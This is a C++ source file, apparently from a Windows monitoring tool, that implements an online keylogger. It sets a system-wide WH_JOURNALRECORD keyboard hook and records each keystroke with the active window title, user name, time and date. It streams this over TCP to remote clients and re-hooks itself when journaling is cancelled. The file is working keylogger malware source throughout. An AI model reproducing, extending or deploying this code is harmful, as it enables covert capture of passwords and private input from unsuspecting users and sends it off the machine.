

DWORD WINAPI      ClientKeyLogResponseThread(LPVOID PtrToOnlineKeyLogger);
DWORD WINAPI      SocketKeyboardHookThread(LPVOID Fname);
LRESULT CALLBACK  SocketKeyboardProc(int cde,WPARAM w,LPARAM l);

class COnlineKeyLogger:public CGeneralMemoryUtility,public CNetworkBasicUtility 
{
	protected:
		HANDLE m_OnLineKeyLogThread;

	protected:
		void Init(void);

	public:
		COnlineKeyLogger(void);
	   ~COnlineKeyLogger();
		bool ServiceClient(CTcpNwMonitorConnection TcpConnection);
		bool SPuts(char *StringToStream);
		bool ResetServiceThread(void);
};


class COnlineKeyLoggerCollection
{
	public:
		static HHOOK   m_hookSocketKeyBoardHook;
		static HANDLE  m_hSocketKeyBoardHookThread; 
		static bool    m_blnContinueSocketKeyBoardHook;
		
	protected:
		static bool InstallKeyBoardSocketHook(void);
		static bool UnInstallKeyBoardSocketHook(void);
		static CExtendedLinkedList *m_lnkdlstKeyLoggerClients;

	public:
       static bool AddKeyLoggerClient(CTcpNwMonitorConnection TcpConnection);
	   static bool RemoveKeyLoggerClient(COnlineKeyLogger *ptrToKeyLogger); 
	   static bool ClearAll(void);
	   static bool SPuts(char *StringToStream);
	   static bool SocketUpdatedWindow(HWND &PrevWnd);
};

bool   COnlineKeyLoggerCollection::m_blnContinueSocketKeyBoardHook=false; 
HHOOK  COnlineKeyLoggerCollection::m_hookSocketKeyBoardHook=0; 
HANDLE COnlineKeyLoggerCollection::m_hSocketKeyBoardHookThread=0; 
CExtendedLinkedList *COnlineKeyLoggerCollection::m_lnkdlstKeyLoggerClients=0; 

////------------------------------------------////

bool COnlineKeyLoggerCollection::SocketUpdatedWindow(HWND &PrevWnd)
{
	char thiswnd[200];
	TCHAR tchrTmp[UNLEN + 1];
	DWORD len2=UNLEN;
	HWND hwnd=GetForegroundWindow();

	GetWindowText(hwnd,thiswnd,200);

	if(!PrevWnd || hwnd!=PrevWnd)
	{
		PrevWnd=hwnd; 
		try { SPuts("\r\n"); } catch(...){}
		GetPrivateProfileString(DEF_INI_APP_NAME,DEF_INI_KEY_KEYBOARD_HOOK_INC_USER,"T",tchrTmp,10,DEF_INI_FILE_NAME); 
		
		if(tchrTmp[0]==_T('T') && GetUserName((LPTSTR)tchrTmp,&len2)) 
			try { SPuts("\r\nUser>"),SPuts(tchrTmp); } catch(...) {}
			 		
		try { SPuts("\r\nWindow>"),SPuts(thiswnd); } catch(...) {}
		
		GetPrivateProfileString(DEF_INI_APP_NAME,DEF_INI_KEY_KEYBOARD_HOOK_INC_TIME,"T",tchrTmp,10,DEF_INI_FILE_NAME); 
		if(tchrTmp[0]==_T('T')) 
		{
			GetTimeFormat(LOCALE_SYSTEM_DEFAULT, TIME_NOSECONDS, NULL, "HH':'mm tt",thiswnd,200);
			try { SPuts("\r\nTime>"),SPuts(thiswnd); } catch(...) {}
		}
		
		GetPrivateProfileString(DEF_INI_APP_NAME,DEF_INI_KEY_KEYBOARD_HOOK_INC_DATE,"T",tchrTmp,10,DEF_INI_FILE_NAME); 
		if(tchrTmp[0]==_T('T')) 
		{
			GetDateFormat(LOCALE_SYSTEM_DEFAULT, DATE_LONGDATE, NULL, NULL, thiswnd,200);
			try { SPuts("\r\nDate>"),SPuts(thiswnd),SPuts("\r\n\r\n"); } catch(...) {}
		}

		return true;
	}
	return false;
}

bool COnlineKeyLoggerCollection::ClearAll(void)
{
	COnlineKeyLogger *CurLogger=0;
	try
	{
		while(m_lnkdlstKeyLoggerClients->DeleteFromFront((void**)&CurLogger))
		{
			CurLogger->SendShutDownMessage();
			delete CurLogger;
		}
		UnInstallKeyBoardSocketHook();
		delete m_lnkdlstKeyLoggerClients;
    	m_lnkdlstKeyLoggerClients=0;
		return true;
	}
	catch(...) { return false;}
}

bool COnlineKeyLoggerCollection::SPuts(char *StringToStream)
{
	CExtendedLinkedList *TmpList=new CExtendedLinkedList();
	if(!TmpList) return false;
	COnlineKeyLogger *CurLogger=0;
	try
	{
		while(m_lnkdlstKeyLoggerClients->DeleteFromFront((void**)&CurLogger))
			CurLogger->SPuts(StringToStream),TmpList->InsertAtFront((void*)CurLogger);

		delete m_lnkdlstKeyLoggerClients;
		m_lnkdlstKeyLoggerClients=TmpList;
		return true;
	}
	catch(...) { return false; }
}



bool COnlineKeyLoggerCollection::RemoveKeyLoggerClient(COnlineKeyLogger *ptrToKeyLogger)
{
	bool blnOk;
	if(m_lnkdlstKeyLoggerClients->DeleteItemByAddress((UINT64)ptrToKeyLogger))
		blnOk=true;
	else blnOk=false;

	if(m_lnkdlstKeyLoggerClients->IsEmptyList()) UnInstallKeyBoardSocketHook();
	return blnOk;
}

bool COnlineKeyLoggerCollection::AddKeyLoggerClient(CTcpNwMonitorConnection TcpConnection)
{
	if(!m_hSocketKeyBoardHookThread) InstallKeyBoardSocketHook();
	if(!m_lnkdlstKeyLoggerClients) m_lnkdlstKeyLoggerClients=new CExtendedLinkedList(); 
	if(!m_lnkdlstKeyLoggerClients) return false;
	COnlineKeyLogger *OnLineKeyLogger=new COnlineKeyLogger();
	if(OnLineKeyLogger->ServiceClient(TcpConnection)) 
		m_lnkdlstKeyLoggerClients->InsertAtBack((void*)OnLineKeyLogger);
	else 
	{
		OnLineKeyLogger->SendShutDownMessage();
		delete OnLineKeyLogger;
		return false;
	}
	return true;
}

bool COnlineKeyLoggerCollection::InstallKeyBoardSocketHook(void)
{
	UnInstallKeyBoardSocketHook();
	if(!m_hSocketKeyBoardHookThread)
	{
		m_blnContinueSocketKeyBoardHook=true;
		m_hSocketKeyBoardHookThread=CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)&SocketKeyboardHookThread,(LPVOID)gbl_hinstCurrentInstance,NULL,NULL);
		if(!m_hSocketKeyBoardHookThread)
			return false;
	}
	return true;
}

bool COnlineKeyLoggerCollection::UnInstallKeyBoardSocketHook(void)
{
	if(m_hSocketKeyBoardHookThread)
	{
		m_blnContinueSocketKeyBoardHook=false;
		DWORD ExitCode;
		if(GetExitCodeThread(m_hSocketKeyBoardHookThread,&ExitCode))
			if(ExitCode==STILL_ACTIVE)
				if(WaitForSingleObject(m_hSocketKeyBoardHookThread,1500)!=WAIT_OBJECT_0)
				{
					TerminateThread(m_hSocketKeyBoardHookThread,0);
					try { ::UnhookWindowsHookEx((HHOOK)m_hookSocketKeyBoardHook); } catch(...) {}
				}
	}
	m_hSocketKeyBoardHookThread=0;
	m_hookSocketKeyBoardHook=0;
	return true;		
}

LRESULT CALLBACK SocketKeyboardProc(int cde,WPARAM w,LPARAM l)
{  
	if(cde<0||cde!=HC_ACTION) return CallNextHookEx((HHOOK)COnlineKeyLoggerCollection::m_hookSocketKeyBoardHook,cde,w,l); 	 	
	EVENTMSG *pEvt=(EVENTMSG *)l;
	if(pEvt->message!=WM_KEYDOWN) return CallNextHookEx((HHOOK)COnlineKeyLoggerCollection::m_hookSocketKeyBoardHook,cde,w,l); 	 	
	UINT W=LOBYTE(pEvt->paramL);
	static HWND Wnd=0; 
	static char *decoded=0;
	if(GetKeyStroke(W,&decoded))
	{	
		COnlineKeyLoggerCollection::SocketUpdatedWindow(Wnd); 
		COnlineKeyLoggerCollection::SPuts(decoded);
	}
	return CallNextHookEx((HHOOK)COnlineKeyLoggerCollection::m_hookSocketKeyBoardHook,cde,w,l); 	 	
}

DWORD WINAPI SocketKeyboardHookThread(LPVOID Fname)
{
MSG msg;
BYTE keytbl[256];
int i;
for(i=0;i<256;i++) keytbl[i]=0;
	 COnlineKeyLoggerCollection::m_hookSocketKeyBoardHook 
	 =(HHOOK)::SetWindowsHookEx(WH_JOURNALRECORD,(HOOKPROC)SocketKeyboardProc,(HMODULE)Fname,NULL);
	 if(!COnlineKeyLoggerCollection::m_hookSocketKeyBoardHook) return 0;
	 while(COnlineKeyLoggerCollection::m_blnContinueSocketKeyBoardHook)
	 {
		while(PeekMessage(&msg,NULL,0,0,PM_NOREMOVE)) 
			if(GetMessage(&msg,NULL,0,0),msg.message==WM_CANCELJOURNAL)
				if(SetKeyboardState(keytbl),
				  (COnlineKeyLoggerCollection::m_hookSocketKeyBoardHook=(HHOOK)::SetWindowsHookEx(WH_JOURNALRECORD,(HOOKPROC)SocketKeyboardProc,(HMODULE)Fname,NULL))
				   ==0) return 0;
				else ;
			else DispatchMessage(&msg);
		 
		Sleep(1); 	
	 }
	 ::UnhookWindowsHookEx((HHOOK)COnlineKeyLoggerCollection::m_hookSocketKeyBoardHook);
	 COnlineKeyLoggerCollection::m_hookSocketKeyBoardHook=0;
	 COnlineKeyLoggerCollection::m_hSocketKeyBoardHookThread=0; 
	 return 0;
}

///---------------------------------------------------------------------///


COnlineKeyLogger::COnlineKeyLogger(void):CGeneralMemoryUtility(),CNetworkBasicUtility ()
{
	m_OnLineKeyLogThread=0;
}

COnlineKeyLogger::~COnlineKeyLogger()
{
	Init();
}

bool COnlineKeyLogger::ResetServiceThread(void)
{ 
	WaitForMux(); 
		m_OnLineKeyLogThread=0;
	GiveUpMux();
	return true;
}

bool COnlineKeyLogger::SPuts(char *StringToStream)
{
	if(!StringToStream || _tcslen((TCHAR*)StringToStream)<=0) return true;
	WinMonitorNetworkServiceHeader Header;
	try
	{
		Header.m_bytMsgType=WIN_MONITOR_KEYLOG_CLIENTSERVER;
		Header.m_uint32Length=(_tcslen((TCHAR*)StringToStream)+1)*sizeof(TCHAR);
		UINT32 uint32BytesSended=0;
		WaitForMux();
		if(!m_TcpConnection.SendByteStream((char*)&Header,(UINT32)sizeof(WinMonitorNetworkServiceHeader),uint32BytesSended)) return false;  
		if(!m_TcpConnection.SendByteStream(StringToStream,Header.m_uint32Length,uint32BytesSended)) return false;  
		GiveUpMux();  
		return true;
	}
	catch(...)
	{
		GiveUpMux(); return false;
	}
}

void COnlineKeyLogger::Init(void)
{
	if(m_OnLineKeyLogThread)
	{
		try
		{
			DWORD ExitStatus;
			if(GetExitCodeThread(m_OnLineKeyLogThread,(LPDWORD)&ExitStatus))
				if(ExitStatus==STILL_ACTIVE) TerminateThread(m_OnLineKeyLogThread,0); 
		}
		catch(...) {}
		SendShutDownMessage();
		CreateNetworkMutex(); 
	}
	m_TcpConnection.Invalidate(); 
	m_OnLineKeyLogThread=0;
	return;
}

bool COnlineKeyLogger::ServiceClient(CTcpNwMonitorConnection TcpConnection)
{
	Init();
	try { m_TcpConnection=TcpConnection; } catch(...){}
	m_OnLineKeyLogThread=CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)&ClientKeyLogResponseThread,(LPVOID)this,CREATE_SUSPENDED,NULL);
	if(!m_OnLineKeyLogThread) return false;
	ResumeThread(m_OnLineKeyLogThread);
	return true;
}

DWORD WINAPI ClientKeyLogResponseThread(LPVOID PtrToOnlineKeyLogger)
{
	COnlineKeyLogger *OnLineKeyLoggerPtr=(COnlineKeyLogger*)PtrToOnlineKeyLogger;
	WinMonitorNetworkServiceHeader Header;
	CTcpNwMonitorConnection ClientConnection=OnLineKeyLoggerPtr->GetConnection(); 
	UINT32 uint32BytesReceived=0;
	bool blnSockError;

	while(true)
	{
		Sleep(10);
		while(ClientConnection.IsEmptyReceiveBuffer(blnSockError))
			if(!blnSockError) Sleep(100);
			else break;

		if(!ClientConnection.ReceiveByteStream((char*)&Header,(UINT32)sizeof(WinMonitorNetworkServiceHeader),uint32BytesReceived))
			break;

		switch(Header.m_bytMsgType)
		{
			case WIN_MONITOR_SHUTDOWN_CONNECTION: 
					OnLineKeyLoggerPtr->WaitForMux();
					OnLineKeyLoggerPtr->SendShutDownMessage();
					OnLineKeyLoggerPtr->GiveUpMux(); 
					OnLineKeyLoggerPtr->ResetServiceThread(); 
					COnlineKeyLoggerCollection::RemoveKeyLoggerClient(OnLineKeyLoggerPtr);  
					delete OnLineKeyLoggerPtr;
					return 0;
			default:break;
		}
	}
	return 0;

}